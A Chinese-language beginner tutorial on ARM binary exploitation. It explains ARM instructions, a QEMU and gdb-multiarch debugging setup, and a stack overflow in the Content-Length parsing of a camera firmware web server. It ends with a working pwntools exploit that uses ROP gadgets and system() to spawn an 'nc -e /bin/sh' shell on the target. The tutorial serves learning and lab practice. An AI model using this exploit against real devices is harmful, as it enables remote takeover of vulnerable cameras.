刚刚开始学习ARM pwn，下面如有错误，希望各位大佬多多包涵。

先介绍下 Arm的一些常见指令。

## Arm 三操作数指令

    
    
    LDRB   R0, [R1, #-1] # 把R1-1的地址的值给R0
    立即数前面加个 `#`

看看函数开始时

    
    
    PUSH            {R4,R5,R7,LR}
    STMFD   SP!, {R4-R11,LR}
    这两条指令都常见在函数的开始
    都是 压入栈中

Arm指令中的 - 感觉蛮简洁的，可以省略很多步骤和指令。

    
    
    {R0-R4} 就是指 R0 R1 R2 R3 R4 寄存器

## Arm LDR 指令

    
    
    ldr指令的格式：
    LDR R0, [R1]
    LDR R0, =NAME
    LDR R0, =0X123
    对于第一种没有等号的情况，R1寄存器对应地址的数据被取出放入R0
    对于第二种有等号的情况，R0寄存器的值将为NAME标号对应的地址。
    对于第三种有等号的情况，R0寄存器的值将为立即数的值

LDM 和 STM是多数据传送指令，用来装载和存储多个字的数据从/到内存。比如：

    
    
    STMFD   SP!, {R4-R11,LR} 的伪代码如下
    SP ＝ SP － 9×4；
    address = SP;
    for i = 4 to 11
    Memory[address] = Ri;
    address  = address + 4;
    Memory[address] = LR;
    总的来说就是 把{R4-R11}压到栈中，然后再把LR压到栈中
    
    指令格式是:
      xxM{条件}{类型}  Rn{!}, <寄存器列表>{^}
    ‘xx’是 LD 表示装载，或 ST 表示存储。
    
    再加 4 种‘类型’就变成了 8 个指令:
    
      栈        其他
      LDMED     LDMIB     预先增加装载
      LDMFD     LDMIA     过后增加装载
      LDMEA     LDMDB     预先减少装载
      LDMFA     LDMDA     过后减少装载
    
      STMFA     STMIB     预先增加存储
      STMEA     STMIA     过后增加存储
      STMFD     STMDB     预先减少存储
      STMED     STMDA     过后减少存储

寄存器命名![](https://image.3001.net/images/20200807/1596779501.png!small)

在常见的程序中 前面的命名一般都是以R*，一些比较特殊的寄存器，就命令，比如 LR SP 在IDA里面都是显示APCS。

    
    
    STR(存储) 和 LDR(装载) 是来存储 和 装载单一字节或字的数据从/到内存
      LDR{条件}    Rd, <地址>
      STR{条件}    Rd, <地址>
     在STR 、LDR、 MOV后面加上EQ 代表的是 32位
     
    ldr = Load Word
    ldrh = Load unsigned Half Word
    ldrsh = Load signed Half Word
    ldrb = Load unsigned Byte
    ldrsb = Load signed Bytes
      
    str = Store Word
    strh = Store unsigned Half Word
    strsh = Store signed Half Word
    strb = Store unsigned Byte
    strsb = Store signed Byte

## Arm 跳转

    
    
    B address  #就像是jmp
    BL #后面加分支 # 相当于call
    BL      strncpy
    BEQ #不等于 想到于 jne
    BCC #进位清除，应该就是 cmp后，进位为0就跳 感觉就像是 <
    BGT # 大于
    BLT #小于
    BCS #进位设置，应该就是cmp后，有进位 感觉就像是 >=
    BLX #实现跳转的同时切换ARM的状态ARM->Thunb或者Thunb->ARM
    BX #可以跳转到ARM指令或者Thumb指令

## Arm 程序状态寄存器处理指令

    
    
    MRS：用于将程序状态寄存器的内容送到通用寄存器
    MSR：将操作数的内容送到程序状态寄存器的特定域

## Arm 比较指令

    
    
    CMP 这个跟 x86的差不多，不改变寄存器的值,更新CPSR标志寄存器
    TST 感觉跟test 有点像 都是不影响目的寄存器的值，改变状态寄存器

Arm 标志位![](https://image.3001.net/images/20200807/1596779518.png!small)

做题，了解这些指令就差不多了~

## 环境搭建

可以用qemu-arm加 gdb-multiarch , gdb-multiarch 加gdbserver或者直接arm_now
(后面这个。我安装了还是不太会用。逃····

第一种

这种我没具体的调试过，之前就用了一次，感觉没第二种舒服

    
    
    sudo apt-get install git gdb gdb-multiarch
    apt search "libc6-" | grep "arm"
    sudo apt-get install -y gcc-arm-linux-gnueabi
    
    qemu-arm -g port -L /usr/arm-linux-gnueabi ./pwn
    这是运行程序，-L是依赖库
    然后用gdb-multiarch 
    targe remote 上去
    

第二种

首先先下载 arm-debian的qemu镜像

<https://people.debian.org/~aurel32/qemu/armel/> or

<https://people.debian.org/~aurel32/qemu/armhf/>

    
    
    #这些都是在本机进行操作
    sudo tunctl -t tap0 -u `whoami` #这边新建一张网卡和虚拟机进行通信
    sudo ifconfig tap0 192.168.2.1/24 #给网卡配置ip
    #这个配置要在一个段上面，这个是为了后面方便传文件进qemu虚拟机里面
    #然后
    qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1"  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic  #启动虚拟机镜像
    #如果下载的是armel 就上面的，gdbserver也要用对应的armel
    #如果下载的是armhf 就对应改下几个就可以
    
    #具体参数 可以 sudo qemu-system-arm -h 查看
    #然后最后把simpleHTTPServer起来就OK
    #在想传文件的目录运行
    python -m SimpleHTTPServer#默认起8000端口，反正这端口一般也没用，懒得改默认了
    
    #然后进入虚拟机
    #密码账号都是root
    #进去之后 如果是固件的话一般都是能把整个环境弄到，那就用chroot起，这样方便，chroot起的，
    #要把proc和dev挂载到chroot起了之后的根目录
    sudo mount -o bind /dev ./squashfs-root/dev
    sudo mount -t proc /proc ./squashfs-root/proc
    #然后也配置网卡地址
    ifconfig eth0 192.168.2.2/24
    #然后用 
    wget http://x.x.x.x:8000/filename
    #把文件给拷进来,调试程序，gdbserver都是需要拷进来
    #gdbserver 下载链接
    #https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt
    #chroot
    chroot . sh
    #用gdbsever起环境
    #gdb-multiarch attach上去就能调试了

其他：

    
    
    qemu-arm-static 可以运行静态编译的可执行程序
    sudo apt install qemu-user-static
    这个可以用来调试静态编译的文件

## 实例调试分析

就只开了 nx

漏洞所在的函数

    
    
    int __fastcall sub_17F80(char *a1)
    {
      char *v1; // r4
      char *v2; // r0
      int v3; // r3
      char *v4; // r5
      unsigned int v5; // r9
      unsigned __int8 *v6; // r8
      char *v7; // r3
      int v8; // r6
      int v9; // t1
      int v10; // r10
      int v11; // r2
      int v12; // r2
      unsigned __int8 *v13; // r0
      bool v14; // zf
      int v15; // r2
      int v16; // t1
      bool v17; // zf
      char *v18; // ST14_4
      int v19; // r0
      int v20; // r2
      int v21; // r1
      ssize_t v22; // r5
      int v23; // r2
      char *v24; // r0
      const char *v25; // r6
      char *v26; // r0
      int result; // r0
      int v28; // r6
      FILE *v29; // r0
      int v30; // r6
      FILE *v31; // r0
      const char *v32; // r1
      int v33; // r2
      int v34; // r3
      char *v35; // r7
      char *v36; // r6
      char *v37; // r0
      int v38; // r7
      int v39; // r0
      int v40; // r2
      unsigned int v41; // r3
      char *haystack; // [sp+Ch] [bp-44h]
      char dest[4]; // [sp+18h] [bp-38h]
      int v44; // [sp+1Ch] [bp-34h]
      int v45; // [sp+20h] [bp-30h]
      int v46; // [sp+24h] [bp-2Ch]
    
      v1 = a1;
      haystack = a1 + 13690;
      v2 = strncpy(a1 + 21882, a1 + 13690, 0x1FFFu);
      v3 = *((_DWORD *)v1 + 1629);
      v4 = &v1[*((_DWORD *)v1 + 18) + 13690];
      v5 = (unsigned int)&haystack[v3];
      if ( dword_34864 & 0x10 && (unsigned int)v4 < v5 )
      {
        haystack[v3] = 0;
        sub_16534(v2);
        fprintf((FILE *)stderr, "%s:%d - Parsing headers (\"%s\")\n", "src/read.c", 57, v4);
      }
      v6 = (unsigned __int8 *)(v4 - 1);
      v7 = v4;
      if ( (unsigned int)v4 >= v5 )
      {
    LABEL_26:
        if ( *(_DWORD *)v1 > 3u )
          return 1;
        v21 = *((_DWORD *)v1 + 1629);
        if ( (unsigned int)(0x1FFF - v21) >= 0x2000 )
        {
          sub_1627C(v1);
          fwrite("No space left in client stream buffer, closing\n", 1u, 0x2Fu, (FILE *)stderr);
          result = 0;
          *((_DWORD *)v1 + 4) = 400;
          *(_DWORD *)v1 = 12;
          return result;
        }
        v22 = read(*((_DWORD *)v1 + 1112), &haystack[v21], 0x2000 - v21);
        if ( !strncmp(haystack, "POST", 4u) || (v26 = (char *)strncmp(haystack, "PUT", 3u)) == 0 )
        {
          v23 = (unsigned __int8)v1[13690];
          *(_DWORD *)dest = 0;
          v44 = 0;
          v45 = 0;
          v46 = 0;
          if ( v23 )
          {
            v35 = strstr(haystack, "Content-Length");
            v36 = strchr(v35, '\n');
            v37 = strchr(v35, ':');
            strncpy(dest, v37 + 1, v36 - (v37 + 1)); // 这里复制有bug
          }
          v24 = strstr(haystack, "\r\n\r\n");
          if ( v24 && (v25 = v24 + 4, (signed int)(v24 + 4) <= (signed int)&haystack[*((_DWORD *)v1 + 1629) - 1 + v22]) )
          {
            v26 = strstr(haystack, "upgrade.cgi");
            if ( !v26 || (v26 = strstr(v25, "\r\n\r\n")) != 0 )
            {
              *((_DWORD *)v1 + 7623) = -1;
              goto LABEL_36;
            }
            v30 = (int)(v1 + 28672);
            ++*((_DWORD *)v1 + 7623);
            v31 = (FILE *)stderr;
            v32 = "req->iCount++(2)= %d\n";
          }
          else
          {
            v30 = (int)(v1 + 28672);
            v31 = (FILE *)stderr;
            v32 = "req->iCount++= %d\n";
            ++*((_DWORD *)v1 + 7623);
          }
          fprintf(v31, v32);
          v33 = *(_DWORD *)(v30 + 1820);
          v26 = (char *)(1717986919 * v33);
          *(_DWORD *)(v30 + 1820) = v33 % 20;
        }
    LABEL_36:
        if ( v22 < 0 )
        {
          v34 = *_errno_location();
          if ( v34 != 4 )
          {
            if ( v34 == 11 )
              return -1;
            sub_1627C(v1);
            perror("header read");
            *((_DWORD *)v1 + 4) = 400;
            return 0;
          }
        }
        else
        {
          if ( !v22 )
          {
            if ( *((_DWORD *)v1 + 1628) >= (unsigned int)dword_37E6C || *((_DWORD *)v1 + 15) || *((_DWORD *)v1 + 1629) )
            {
              sub_1627C(v1);
              fwrite("client unexpectedly closed connection.\n", 1u, 0x27u, (FILE *)stderr);
            }
            *((_DWORD *)v1 + 4) = 400;
            return 0;
          }
          v14 = (dword_34864 & 0x10) == 0;
          *((_DWORD *)v1 + 1629) += v22;
          if ( !v14 )
          {
            sub_16534(v26);
            v29 = (FILE *)stderr;
            v1[*((_DWORD *)v1 + 1629) + 13690] = 0;
            fprintf(v29, "%s:%d -- We read %d bytes: \"%s\"\n", "src/read.c", 356, v22, "");
          }
        }
        return 1;
      }
      while ( 2 )
      {
        if ( *((_DWORD *)v1 + 7623) > 0 )
          goto LABEL_26;
        v9 = (unsigned __int8)*v4++;
        v8 = v9;
        v10 = v9 - 13;
        if ( v9 != 13 )
          v10 = 1;
        if ( v8 == 161 )
          v11 = v10 & 1;
        else
          v11 = 0;
        if ( v11 )
        {
          v12 = *v6;
          v13 = v6;
          v14 = v12 == 0;
          if ( *v6 )
            v14 = v12 == 10;
          if ( !v14 )
          {
            do
            {
              v16 = *(v13-- - 1);
              v15 = v16;
              v17 = v16 == 0;
              if ( v16 )
                v17 = v15 == 10;
            }
            while ( !v17 );
          }
          v18 = v7;
          v19 = strncmp((const char *)v13 + 1, "User-Agent:", 0xBu);
          v7 = v18;
          if ( v19 )
          {
            sub_1627C(v1);
            fprintf((FILE *)stderr, "Illegal character (%d) in stream.\n", 161);
            sub_1B8(v1);
            return 0;
          }
        }
        v20 = *(_DWORD *)v1;
        switch ( *(_DWORD *)v1 )
        {
          case 0:
            if ( v8 == 13 )
            {
              *((_DWORD *)v1 + 17) = v7;
              *(_DWORD *)v1 = 1;
              goto LABEL_24;
            }
            if ( v8 != 10 )
              goto LABEL_24;
            *((_DWORD *)v1 + 17) = v7;
            *(_DWORD *)v1 = 2;
            goto LABEL_52;
          case 1:
            if ( v8 != 10 )
              goto LABEL_22;
            *(_DWORD *)v1 = 2;
    LABEL_52:
            ++*((_DWORD *)v1 + 18);
            goto LABEL_53;
          case 2:
            if ( v8 == 13 )
            {
              *(_DWORD *)v1 = 3;
              goto LABEL_24;
            }
            if ( v8 != 10 )
            {
    LABEL_23:
              *(_DWORD *)v1 = 0;
    LABEL_24:
              ++*((_DWORD *)v1 + 18);
    LABEL_25:
              ++v6;
              v7 = v4;
              if ( (unsigned int)v4 >= v5 )
                goto LABEL_26;
              continue;
            }
    LABEL_45:
            ++*((_DWORD *)v1 + 18);
            *(_DWORD *)v1 = 4;
    LABEL_46:
            v28 = sub_1A4F4(v1);
            if ( !v28 )
              return 0;
            if ( (unsigned int)(*((_DWORD *)v1 + 3) - 3) > 1 )
              return v28;
            v38 = *((_DWORD *)v1 + 42);
            *((_DWORD *)v1 + 17) = &v1[*((_DWORD *)v1 + 1629) + 13690];
            *((_DWORD *)v1 + 16) = v4;
            *(_DWORD *)v1 = 5;
            if ( !v38 )
            {
              sub_1627C(v1);
              fwrite("Unknown Content-Length POST!\n", 1u, 0x1Du, (FILE *)stderr);
              sub_1B8(v1);
              return 0;
            }
            v39 = sub_216EC(v38);
            if ( v39 < 0 )
            {
              sub_1627C(v1);
              fprintf((FILE *)stderr, "Invalid Content-Length [%s] on POST!\n", *((_DWORD *)v1 + 42));
              sub_1B8(v1);
              return 0;
            }
            v40 = *((_DWORD *)v1 + 16);
            v41 = *((_DWORD *)v1 + 17) - v40;
            *((_DWORD *)v1 + 11) = v39;
            *((_DWORD *)v1 + 12) = 0;
            if ( v39 >= v41 )
              return v28;
            *((_DWORD *)v1 + 17) = v40 + v39;
            return v28;
          case 3:
            if ( v8 == 10 )
              goto LABEL_45;
    LABEL_22:
            if ( v10 )
              goto LABEL_23;
            goto LABEL_24;
          default:
            ++*((_DWORD *)v1 + 18);
            if ( v20 == 2 )
            {
    LABEL_53:
              **((_BYTE **)v1 + 17) = 0;
              if ( *((_DWORD *)v1 + 17) - *((_DWORD *)v1 + 16) > 3071 )
              {
                sub_1627C(v1);
                fprintf(
                  (FILE *)stderr,
                  "Header too long at %lu bytes: \"%s\"\n",
                  *((_DWORD *)v1 + 17) - *((_DWORD *)v1 + 16));
                sub_1B8(v1);
                return 0;
              }
              if ( *((_DWORD *)v1 + 15) )
              {
                if ( !sub_1A878(v1) )
                  return 0;
              }
              else
              {
                if ( !sub_19FF0(v1) )
                  return 0;
                if ( *((_DWORD *)v1 + 2) == 1 )
                  return sub_1A4F4(v1);
              }
              *((_DWORD *)v1 + 16) = v4;
            }
            else if ( v20 == 4 )
            {
              goto LABEL_46;
            }
            goto LABEL_25;
        }
      }
    }

上面看到 strcpy存在bug，就是长度时按照输入来计算的，这时只要控制好，就能实现栈溢出。

先看看前面的的指令有没分析正确![](https://image.3001.net/images/20200807/1596779606.png!small)

能看出那些寄存器是用来做参数的 r0 r1 r2
，然后依次往后![](https://image.3001.net/images/20200807/1596779619.png!small)

r3 是栈顶指针，lr是保存着返回地址，pc就是当前指令的下一条，cpsr 程序状态寄存器

看看程序开头和结尾

开头![](https://image.3001.net/images/20200807/1596779639.png!small)

结尾![](https://image.3001.net/images/20200807/1596779650.png!small)

R4-R11，LR都是放进栈里，如果发生了栈溢出，那岂不是能基本控制大多数的参数了，前面4个没有控制，我估摸着是用来做 传参用的。

这道题还是把aslr关了。

看到上图就清楚，此时的栈已经被控制了，执行为箭头所指向的，那r4-r11，LR都给控制了。

关了aslr就是直接执行system了，但是得控制参数，这个就直接用ROPgadgets就OK了

直接控制R0就ok

exp：

    
    
    from pwn import *
    
    context.log_level ='debug'
    
    p = remote("192.168.2.2",80)
    system_addr = 0x76f74ab0
    
    order_commad  = "nc  -lp 4444 -e /bin/sh;pwd;pwd;"
    pre = "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:"
    payload = "a"*52+p32(0x00048784+0x76f2d000)+p32(0x7effeb68)+p32(0x00016aa4+0x76f2d000)+'a'*8+p32(system_addr)
    payload = pre+payload+order_commad+"\n\r\n\r\n"
    
    p.sendline(payload)
    p.interactive()

## 参考链接

> <https://xz.aliyun.com/t/5054>
>
> <https://ray-> cp.github.io/archivers/2019-09-22-vivetok_remote_stack_overflow>

## 相关实验

> ARM漏洞利用技术一--编写arm shellcode
>
> <https://www.hetianlab.com/expc.do?ec=ECID3ab6-0a4a-40bb-88e8-d19efce371b5>
>
>
> （通过该实验了解arm环境下编写shellcode的基本过程，以execve()为例，详细介绍了相关步骤，包括系统调用、系统调用后、函数参数、去除空字符、转换进制等。）

